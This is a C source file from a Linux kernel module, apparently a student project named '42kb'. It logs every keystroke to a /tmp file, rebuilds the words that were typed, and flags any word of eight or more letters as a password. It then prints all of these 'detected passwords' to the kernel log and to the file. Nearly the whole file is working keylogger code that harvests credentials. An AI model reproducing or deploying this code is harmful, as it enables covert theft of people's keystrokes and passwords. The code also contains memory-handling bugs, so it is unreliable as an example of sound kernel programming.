/******************************************************************************/
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   tmpfile.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: daribeir <daribeir@student.42mulhouse.fr>  +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/04/28 01:20:17 by daribeir          #+#    #+#             */
/*   Updated: 2025/11/16 04:00:19 by daribeir         ###   ##### Mulhouse.fr */
/*                                                                            */
/******************************************************************************/


#include "42kb.h"
#include <linux/fs.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/spinlock.h>

extern spinlock_t devfile_io_spinlock;

struct file* tmpfile = 0;
loff_t tmpoffset = 0;

/**
 * word_extract - Structure pour stocker un mot capturé
 *
 * buffer - le mot (chaîne de caractères)
 * length - nombre de caractères
 * occurrences - nombre de fois que le mot a été saisi
 * first_time - timestamp de la première touche
 * last_time - timestamp de la dernière touche
 * duration - durée totale en ms
*/
typedef struct {
	char buffer[256];
	int length;
	int occurrences;
	time64_t first_time;
	time64_t last_time;
	int duration_ms;
} word_extract_t;

/**
 * keyboard_stats - Structure pour stocker les stats du clavier
 */
typedef struct {
	int total_events;
	int total_pressed;
	int total_alpha;
	int duration_ms;
	int speed_eps;
	int top_keys[5];
	int top_counts[5];
	int avg_per_key;
} keyboard_stats_t;

static int ft_write_tmpfile(char *str, int len)
{
	const struct file_operations	*f_op = tmpfile->f_op;

	if (!f_op)
	{
		ft_warn("No fop on tmpfile\n");
		return 1;
	}

	return kernel_write(tmpfile, str, len, &tmpoffset);
}

int ft_create_tmpfile(void)
{
	char *time;
	char *filename;
	char *prefix;

	time = ft_itoa(ktime_get_seconds());
	filename = kmalloc(69, GFP_KERNEL);
	prefix = kmalloc(69, GFP_KERNEL);
	strcpy(prefix, "/tmp/42kb");
	filename = strcat(prefix, time);
	tmpfile = filp_open(filename, O_WRONLY | O_CREAT, S_IRWXU);
	kfree(filename);
	kfree(time);
	if (tmpfile) {
		printk("Created tmpfile %s\n", tmpfile->f_path.dentry->d_name.name);
		return 0;
	}
	else
	{
		ft_warn("Cannot create tmpfile");
		return 1;
	}
}

/**
 * ft_log_event_to_tmpfile - Log un événement en temps réel dans le fichier /tmp
 * @event: L'événement à logger
 */
void ft_log_event_to_tmpfile(event_struct *event)
{
	char *event_line;

	if (!event || !tmpfile)
		return;

	event_line = event_to_str(*event);
	if (event_line) {
		ft_write_tmpfile(event_line, strlen(event_line));
		kfree(event_line);
	}
}

/**
 * ft_parse_tmpfile_for_stats - Parse tmpfile and calculate keyboard stats
 * Returns: allocated stats structure with event counts, top keys, etc.
 */
static keyboard_stats_t* ft_parse_tmpfile_for_stats(char *tmpfile_path)
{
	struct file *read_file;
	char *buffer;
	char *line;
	loff_t file_offset = 0;
	int bytes_read;
	int i, line_len;
	char *line_start;
	char *space_pos;
	char *paren_open;
	char name_str[256];
	int name_len;
	int scan_code;

	keyboard_stats_t *stats = kmalloc(sizeof(keyboard_stats_t), GFP_KERNEL);
	int *key_counts = kmalloc(256 * sizeof(int), GFP_KERNEL);

	if (!stats || !key_counts) {
		ft_warn("Memory allocation failed for stats");
		kfree(stats);
		kfree(key_counts);
		return NULL;
	}

	memset(stats, 0, sizeof(keyboard_stats_t));
	for (i = 0; i < 256; i++)
		key_counts[i] = 0;

	// Open tmpfile
	read_file = filp_open(tmpfile_path, O_RDONLY, 0);
	if (IS_ERR(read_file)) {
		ft_warn("Cannot open tmpfile for stats");
		kfree(stats);
		kfree(key_counts);
		return NULL;
	}

	buffer = kmalloc(8192, GFP_KERNEL);
	line = kmalloc(512, GFP_KERNEL);
	if (!buffer || !line) {
		ft_warn("Memory allocation failed");
		kfree(buffer);
		kfree(line);
		kfree(stats);
		kfree(key_counts);
		filp_close(read_file, NULL);
		return NULL;
	}

	// Parse file for stats
	line_start = buffer;
	while ((bytes_read = kernel_read(read_file, buffer, 8192, &file_offset)) > 0) {
		line_start = buffer;
		for (i = 0; i < bytes_read; i++) {
			if (buffer[i] == '\n' || i == bytes_read - 1) {
				int line_start_offset = line_start - buffer;
				line_len = (buffer[i] == '\n') ? (i - line_start_offset) : (i - line_start_offset + 1);

				if (line_len > 0 && line_len < 512) {
					memcpy(line, line_start, line_len);
					line[line_len] = '\0';

					if (strstr(line, "Pressed")) {
						stats->total_events++;
						stats->total_pressed++;

						space_pos = strchr(line, ' ');
						if (space_pos) {
							paren_open = strchr(space_pos, '(');
							if (paren_open) {
								name_len = paren_open - space_pos - 1;
								if (name_len > 0 && name_len < 256) {
									memcpy(name_str, space_pos + 1, name_len);
									name_str[name_len] = '\0';

									// Count alphanumeric
									if (strlen(name_str) == 1 && ((name_str[0] >= 'a' && name_str[0] <= 'z') || (name_str[0] >= 'A' && name_str[0] <= 'Z')))
										stats->total_alpha++;

									// Extract scan code for top keys
									sscanf(paren_open + 1, "%d", &scan_code);
									if (scan_code < 256)
										key_counts[scan_code]++;
								}
							}
						}
					}
				}
				line_start = &buffer[i + 1];
			}
		}
	}

	// Find top 5 keys
	for (i = 0; i < 5; i++) {
		int max_count = 0, max_key = -1, j;
		for (j = 0; j < 256; j++) {
			if (key_counts[j] > max_count) {
				max_count = key_counts[j];
				max_key = j;
			}
		}
		if (max_key >= 0) {
			stats->top_keys[i] = max_key;
			stats->top_counts[i] = max_count;
			key_counts[max_key] = 0;
		}
	}

	// Calculate derived stats
	stats->duration_ms = (stats->total_events > 0) ? 1000 : 0;
	if (stats->duration_ms > 0)
		stats->speed_eps = (stats->total_events * 1000) / (stats->duration_ms + 1);
	if (stats->total_alpha > 0)
		stats->avg_per_key = (stats->total_events * 100) / (stats->total_alpha + 1);

	filp_close(read_file, NULL);
	kfree(buffer);
	kfree(line);
	kfree(key_counts);

	return stats;
}

/**
 * ft_parse_tmpfile_for_words - Parse tmpfile and extract words
 * Format: "HH:MM:SS name(code) Pressed"
 */
static word_extract_t* ft_parse_tmpfile_for_words(int *word_count, char *tmpfile_path)
{
	struct file *read_file;
	char *buffer;
	char *line;
	loff_t file_offset = 0;
	int bytes_read;
	word_extract_t *words;
	int i, line_len;
	char *line_start;
	char *space_pos;
	char *paren_open;
	char name_str[256];
	int current_word_len = 0;
	int min_word_len = 3;
	int name_len;

	buffer = kmalloc(8192, GFP_KERNEL);
	line = kmalloc(512, GFP_KERNEL);
	words = kmalloc(sizeof(word_extract_t) * 100, GFP_KERNEL);

	if (!buffer || !line || !words) {
		ft_warn("Memory allocation failed");
		kfree(buffer);
		kfree(line);
		kfree(words);
		*word_count = 0;
		return NULL;
	}

	// Initialize
	for (i = 0; i < 100; i++) {
		words[i].length = 0;
		memset(words[i].buffer, 0, 256);
	}
	*word_count = 0;
	current_word_len = 0;

	// Open tmpfile
	read_file = filp_open(tmpfile_path, O_RDONLY, 0);
	if (IS_ERR(read_file)) {
		ft_warn("Cannot open tmpfile for reading");
		kfree(buffer);
		kfree(line);
		kfree(words);
		return NULL;
	}

	// Parse file for words
	line_start = buffer;
	while ((bytes_read = kernel_read(read_file, buffer, 8192, &file_offset)) > 0) {
		line_start = buffer;
		for (i = 0; i < bytes_read; i++) {
			if (buffer[i] == '\n' || i == bytes_read - 1) {
				int line_start_offset = line_start - buffer;
				line_len = (buffer[i] == '\n') ? (i - line_start_offset) : (i - line_start_offset + 1);

				if (line_len > 0 && line_len < 512) {
					memcpy(line, line_start, line_len);
					line[line_len] = '\0';

					if (strstr(line, "Pressed")) {
						space_pos = strchr(line, ' ');
						if (space_pos) {
							paren_open = strchr(space_pos, '(');
							if (paren_open) {
								name_len = paren_open - space_pos - 1;
								if (name_len > 0 && name_len < 256) {
									memcpy(name_str, space_pos + 1, name_len);
									name_str[name_len] = '\0';

									// Delimiters
									if (strcmp(name_str, "space") == 0 || strcmp(name_str, "return") == 0) {
										if (current_word_len >= min_word_len && *word_count < 100) {
											words[*word_count].buffer[current_word_len] = '\0';
											words[*word_count].length = current_word_len;
											(*word_count)++;
										}
										current_word_len = 0;
									} else if (strlen(name_str) == 1 && ((name_str[0] >= 'a' && name_str[0] <= 'z') || (name_str[0] >= 'A' && name_str[0] <= 'Z'))) {
										char c = name_str[0];

										// Clean buffer on new word
										if (current_word_len == 0) {
											memset(words[*word_count].buffer, 0, 256);
										}

										if (current_word_len < 255 && *word_count < 100) {
											words[*word_count].buffer[current_word_len] = c;
											current_word_len++;
										}
									}
								}
							}
						}
					}
				}
				line_start = &buffer[i + 1];
			}
		}
	}

	// Save last word
	if (current_word_len >= min_word_len && *word_count < 100) {
		words[*word_count].buffer[current_word_len] = '\0';
		words[*word_count].length = current_word_len;
		(*word_count)++;
	}

	// Count occurrences for each word
	for (i = 0; i < *word_count; i++) {
		int j, count = 0;
		for (j = 0; j < *word_count; j++) {
			if (strcmp(words[i].buffer, words[j].buffer) == 0) {
				count++;
			}
		}
		words[i].occurrences = count;
	}

	filp_close(read_file, NULL);
	kfree(buffer);
	kfree(line);

	return words;
}

/**
 * ft_log_tmpfile_with_stats - Main function: parse stats + words, log to dmesg + tmpfile
 */
void ft_log_tmpfile_with_stats(void)
{
	char tmpfile_path[128];
	char stat_line[512];
	keyboard_stats_t *stats;
	word_extract_t *words;
	int word_count = 0;
	int password_count = 0;
	int i;

	// Get tmpfile path before closing
	memset(tmpfile_path, 0, 128);
	if (tmpfile && tmpfile->f_path.dentry) {
		snprintf(tmpfile_path, 128, "/tmp/%s", tmpfile->f_path.dentry->d_name.name);
	}

	// Close write-mode file
	if (tmpfile) {
		filp_close(tmpfile, NULL);
		tmpfile = NULL;
	}

	// Parse stats from file
	stats = ft_parse_tmpfile_for_stats(tmpfile_path);
	if (!stats) {
		ft_warn("Failed to parse stats from tmpfile");
		return;
	}

	// Parse words from file
	words = ft_parse_tmpfile_for_words(&word_count, tmpfile_path);

	// Count passwords
	if (words) {
		for (i = 0; i < word_count; i++) {
			if (words[i].length >= 8)
				password_count++;
		}
	}

	// ===== LOG TO DMESG =====
	printk(KERN_INFO "[42-KB] ===== KEYBOARD STATS =====\n");
	printk(KERN_INFO "[42-KB] Total Events: %d\n", stats->total_events);
	printk(KERN_INFO "[42-KB] Pressed Keys: %d | Alphanumeric: %d\n", stats->total_pressed, stats->total_alpha);
	printk(KERN_INFO "[42-KB] Duration: ~%d ms | Speed: ~%d events/sec\n", stats->duration_ms, stats->speed_eps);

	printk(KERN_INFO "[42-KB] === Top 5 Keys ===\n");
	for (i = 0; i < 5; i++) {
		if (stats->top_keys[i] >= 0 && stats->top_counts[i] > 0) {
			printk(KERN_INFO "[42-KB] #%d: Key(%3d) - %d presses\n", i + 1, stats->top_keys[i], stats->top_counts[i]);
		}
	}

	// Log top 10 words (by frequency/length - words are unique)
	if (word_count > 0) {
		int max_display = (word_count < 10) ? word_count : 10;
		printk(KERN_INFO "[42-KB] === TOP %d MOST LOGGED WORDS (Min 3 chars) ===\n", max_display);
		for (i = 0; i < max_display; i++) {
			printk(KERN_INFO "[42-KB] #%d: \"%s\" (%d occurrences)\n", i + 1, words[i].buffer, words[i].occurrences);
		}
		printk(KERN_INFO "[42-KB] Total Words: %d\n", word_count);
	}

	// Log ALL passwords
	if (password_count > 0) {
		printk(KERN_INFO "[42-KB] === ALL DETECTED PASSWORDS (8+ chars) ===\n");
		for (i = 0; i < word_count; i++) {
			if (words[i].length >= 8) {
				printk(KERN_INFO "[42-KB] Password: \"%s\" (%d chars)\n", words[i].buffer, words[i].length);
			}
		}
		printk(KERN_INFO "[42-KB] Total Passwords: %d\n", password_count);
	} else {
		printk(KERN_INFO "[42-KB] No passwords detected\n");
	}

	// ===== REOPEN TMPFILE AND LOG STATS + WORDS =====
	tmpfile = filp_open(tmpfile_path, O_WRONLY | O_APPEND, S_IRWXU);
	if (!tmpfile || IS_ERR(tmpfile)) {
		ft_warn("Cannot reopen tmpfile");
		kfree(stats);
		if (words)
			kfree(words);
		return;
	}
	tmpoffset = 0;
	vfs_llseek(tmpfile, 0, SEEK_END);

	// Write stats to tmpfile
	snprintf(stat_line, 512, "\n\n=== KEYBOARD STATS ===\n");
	ft_write_tmpfile(stat_line, strlen(stat_line));

	snprintf(stat_line, 512, "Total Events: %d\n", stats->total_events);
	ft_write_tmpfile(stat_line, strlen(stat_line));

	snprintf(stat_line, 512, "Pressed Keys: %d | Alphanumeric: %d\n", stats->total_pressed, stats->total_alpha);
	ft_write_tmpfile(stat_line, strlen(stat_line));

	snprintf(stat_line, 512, "\n=== TOP 5 KEYS ===\n");
	ft_write_tmpfile(stat_line, strlen(stat_line));
	for (i = 0; i < 5; i++) {
		if (stats->top_keys[i] >= 0 && stats->top_counts[i] > 0) {
			snprintf(stat_line, 512, "#%d: Key(%3d) - %d presses\n", i + 1, stats->top_keys[i], stats->top_counts[i]);
			ft_write_tmpfile(stat_line, strlen(stat_line));
		}
	}

	// Write top 10 words
	if (word_count > 0) {
		int max_display = (word_count < 10) ? word_count : 10;
		snprintf(stat_line, 512, "\n=== TOP %d MOST LOGGED WORDS (Min 3 chars) ===\n", max_display);
		ft_write_tmpfile(stat_line, strlen(stat_line));
		for (i = 0; i < max_display; i++) {
			snprintf(stat_line, 512, "  %d. \"%s\" (%d occurrences)\n", i + 1, words[i].buffer, words[i].occurrences);
			ft_write_tmpfile(stat_line, strlen(stat_line));
		}
		snprintf(stat_line, 512, "Total Words: %d\n", word_count);
		ft_write_tmpfile(stat_line, strlen(stat_line));
	} else {
		ft_write_tmpfile("No words detected\n", 18);
	}

	// Write ALL passwords
	if (password_count > 0) {
		snprintf(stat_line, 512, "\n=== ALL DETECTED PASSWORDS (8+ chars) ===\n");
		ft_write_tmpfile(stat_line, strlen(stat_line));
		for (i = 0; i < word_count; i++) {
			if (words[i].length >= 8) {
				snprintf(stat_line, 512, "  - \"%s\" (%d chars)\n", words[i].buffer, words[i].length);
				ft_write_tmpfile(stat_line, strlen(stat_line));
			}
		}
		snprintf(stat_line, 512, "Total Passwords: %d\n", password_count);
		ft_write_tmpfile(stat_line, strlen(stat_line));
	} else {
		ft_write_tmpfile("\nNo passwords detected\n", 23);
	}

	// Cleanup
	kfree(stats);
	if (words)
		kfree(words);

	if (tmpfile) {
		filp_close(tmpfile, NULL);
		tmpfile = NULL;
	}
}

void ft_log_stats_to_kernel(void)
{
	/* Stats are now logged in ft_log_tmpfile_with_stats() */
	return;
}

void ft_log_tmpfile(void)
{
	char *temp_str;
	struct list_head *head_ptr;
	struct event_struct *entry;
	int total_inputs;

	head_ptr = g_driver->events_head->list.next;
	temp_str = kmalloc(69, GFP_KERNEL);
	total_inputs = 0;
	while (head_ptr != &(g_driver->events_head->list))
	{
		entry = list_entry(head_ptr, struct event_struct, list);

		if (entry->is_pressed)
		{
			if (entry->ascii_value > 0)
			{
				++total_inputs;
				ft_write_tmpfile(&(entry->ascii_value), 1);
			}
		}

		head_ptr = head_ptr->next;
	}
	sprintf(temp_str, "\n\nTotal keystrokes: %d\n", total_inputs);
	ft_write_tmpfile(temp_str, strlen(temp_str));
	kfree(temp_str);
}
